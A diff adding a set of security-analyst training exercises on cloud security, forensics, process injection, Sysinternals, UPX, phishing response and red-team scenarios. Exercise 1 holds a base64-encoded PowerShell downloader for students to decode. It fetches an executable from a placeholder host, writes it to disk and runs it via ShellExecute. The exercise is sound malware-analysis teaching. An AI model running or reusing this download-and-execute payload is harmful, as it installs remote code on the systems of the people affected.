@@ -1,0 +1,133 @@
+Exercise 1
+You are an Information security officer of a company. You are the sole person
+responsible for the security of the company. You have to take care of the people,
+processes, and tools.
+
+1. How are you going to keep secure data in the cloud? In which way will you
+transform the data?
+2. Do you prefer public cloud, private cloud, and hybrid cloud?
+3. How are you going to classify data?
+4. You have asked a forensic analyst to do an investigation. It appears that
+the user attempted to erase data. After that, the analyst wanted to store
+data on the hard drive.
+a. Will you allow it? Why?
+b. What analysis did the user want to do?
+5. Understand the below-encrypted data:
+
+powershell.exe -NoP -Exec Bypass -EC
+
+JABpAG4AcwB0AGEAbgBjAGUAIAA9ACAAWwBTAHkAcwB0AGUAbQAuAEEAYwB0AGkAdg
+BhAHQAbwByAF0AOgA6AEMAcgBlAGEAdABlAEkAbgBzAHQAYQBuAGMAZQAoACIAUwB5
+AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACIAKQA7AA0ACgAkAG
+0AZQB0AGgAbwBkACAAPQAgAFsAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAEMA
+bABpAGUAbgB0AF0ALgBHAGUAdABNAGUAdABoAG8AZABzACgAKQA7AA0ACgBmAG8Ac
+gBlAGEAYwBoACgAJABtACAAaQBuACAAJABtAGUAdABoAG8AZAApAHsADQAKAA0ACgAg
+ACAAaQBmACgAJABtAC4ATgBhAG0AZQAgAC0AZQBxACAAIgBEAG8AdwBuAGwAbwBhAG
+QARABhAHQAYQAiACkAewANAAoAIAAgACAAIAAgAHQAcgB5AHsADQAKACAAIAAgACAAI
+AAkAHUAcgBpACAAPQAgAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABTAHkAcwB0AGUAbQAu
+AFUAcgBpACgAIgBoAHQAdABwADoALwAvAGIAYQBkAHcAZQBiAHMAaQB0AGUALgBjAG8
+AbQAvAHgAYQBwAF8AMQAwADIAYgAtAEEAWgAxAC8ANwAwADQAZQAuAHAAaABwAD8A
+bAA9AHoAeQB0AGUAYgA0AC4AZwBhAHMAIgApAA0ACgAgACAAIAAgACAAJAByAGUAcw
+BwAG8AbgBzAGUAIAA9ACAAJABtAC4ASQBuAHYAbwBrAGUAKAAkAGkAbgBzAHQAYQBu
+AGMAZQAsACAAKAAkAHUAcgBpACkAKQA7AA0ACgANAAoAIAAgACAAIAAgACQAcABhAH
+QAaAAgAD0AIABbAFMAeQBzAHQAZQBtAC4ARQBuAHYAaQByAG8AbgBtAGUAbgB0AF0A
+OgA6AEcAZQB0AEYAbwBsAGQAZQByAFAAYQB0AGgAKAAiAEMAbwBtAG0AbwBuAEEAcA
+BwAGwAaQBjAGEAdABpAG8AbgBEAGEAdABhACIAKQAgACsAIAAiAFwAXABIAFMAVABIA
+GoAbgBoAGMALgBlAHgAZQAiADsADQAKACAAIAAgACAAIABbAFMAeQBzAHQAZQBtAC
+4ASQBPAC4ARgBpAGwAZQBdADoAOgBXAHIAaQB0AGUAQQBsAGwAQgB5AHQAZQBzAC
+gAJABwAGEAdABoACwAIAAkAHIAZQBzAHAAbwBuAHMAZQApADsADQAKAA0ACgAgACA
+AIAAgACAAJABjAGwAcwBpAGQAIAA9ACAATgBlAHcALQBPAGIAagBlAGMAdAAgAEcAdQB
+pAGQAIAAnAEMAMAA4AEEARgBEADkAMAAtAEYAMgBBADEALQAxADEARAAxAC0AOAA0
+ADUANQAtADAAMABBADAAQwA5ADEARgAzADgAOAAwACcADQAKACAAIAAgACAAIAAk
+AHQAeQBwAGUAIAA9ACAAWwBUAHkAcABlAF0AOgA6AEcAZQB0AFQAeQBwAGUARgByA
+G8AbQBDAEwAUwBJAEQAKAAkAGMAbABzAGkAZAApAA0ACgAgACAAIAAgACAAJABvAGI
+AagBlAGMAdAAgAD0AIABbAEEAYwB0AGkAdgBhAHQAbwByAF0AOgA6AEMAcgBlAGEAdA
+BlAEkAbgBzAHQAYQBuAGMAZQAoACQAdAB5AHAAZQApAA0ACgAgACAAIAAgACAAJABv
+AGIAagBlAGMAdAAuAEQAbwBjAHUAbQBlAG4AdAAuAEEAcABwAGwAaQBjAGEAdABpAG8
+AbgAuAFMAaABlAGwAbABFAHgAZQBjAHUAdABlACgAJABwAGEAdABoACwAJABuAHUAbA
+AsACAAJABuAHUAbAAsACAAJABuAHUAbAAsADAAKQANAAoADQAKACAAIAAgACAAIAB9
+AGMAYQB0AGMAaAB7AH0ADQAKACAAIAAgACAAIAANAAoAIAAgAH0ADQAKAH0ADQAK
+AA0ACgBFAHgAaQB0ADsA&quot;
+
+Questions
+1. What encoding mechanism is used here?
+2. Please provide a screenshot of this encoded script:
+
+
+Please decode this blob and answer the following:
+1. What is the URL this script attempts to access?
+2. What is the name of the file it tries to save on the system?
+3. Which folder location is this script dedicated to?
+4. What is the ShellExecute method?
+
+Exercise 2
+Please conduct research and answer the following questions:
+Questions
+1. What is process injection? What malware variants use this injection
+technique?
+2. Please specify at least four different memory injection methods and
+describe each one in detail.
+Exercise 3
+1. Please research Sysinternal tools and specify at least three tools you can
+use to analyze a binary file (or a malware binary file).
+a. Please provide the tool name and a screenshot of the tool
+b. Describe what information you could obtain by using each tool.
+c. How would an analyst use each tool to understand what is done during the
+file's execution?
+
+d. Are these tools used for dynamic or static binary file analysis?
+
+2. Please review the following figure and describe the following:
+a. What do you see in the figure?
+b. What does the section mean?
+c. What does the name UPX mean?
+d. What is Entropy, and what is it used for?
+e. What does the import section mean?
+f. Bonus question: Do you recognize the import functions under the
+kernel32.dll?
+
+Exercise 4
+Scenario: You are in the process of reviewing events at the customer Acme
+Incorporated, located in the United States. At one point, you encountered several
+events suggesting a malware infection on the ABC, CDE, and FGH systems. You
+could see the attack flow reviewing those events. During the analysis of these
+events, you determined that the source of infection was a phishing email with a
+malicious document that each one of the users received in his/her inbox. Your
+analysis also concludes that each user successfully launched the malicious
+document and that document successfully downloaded a malware variant from
+the Internet called Emotet. The download was successful, and each one of the
+systems was compromised with this Emotet malware.
+
+Task: Please write a brief summary of how you would notify the customer of this
+information.
+What information will you include in this notification? How would you present it to
+the customer to ensure they( Customers) know and understand the attack flow?
+Your summary must be in English.
+
+Tip for writing this notification:
+● Remember to include a brief description of this threat so the customer can
+understand
+the attack flow.
+● Please provide recommended actions on what the customer should do to
+remediate this
+threat.
+Note: This question is about creativity and testing your ability to notify the
+customer about a threat in a way that the customer can understand. This is less
+about the technical aspect.
+
+Scenario-Based Questions:
+Scenario 1:
+You are a cyber security professional and ethical hacker. You recently changed to
+a new company. What will you do to protect the organization from a possible data
+breach if there is a critical attack?
+Scenario 2:
+In an organization, few users report phishing emails to the security team. Most of
+the emails are triggered from one particular domain. As a security analyst or
+cyber security professional, explain your approach to stopping the phishing
+attack.
+
+You are a cyber security professional and work in the Red Team. Your employer
+asked if they are planning to release a new product and make sure it has to be
+vulnerability free to avoid the zero-day attack. As a red team member, explain
+your workflow and report if you find anything vulnerable. (Red Team is Nothing
+but CEH practicals you have done)
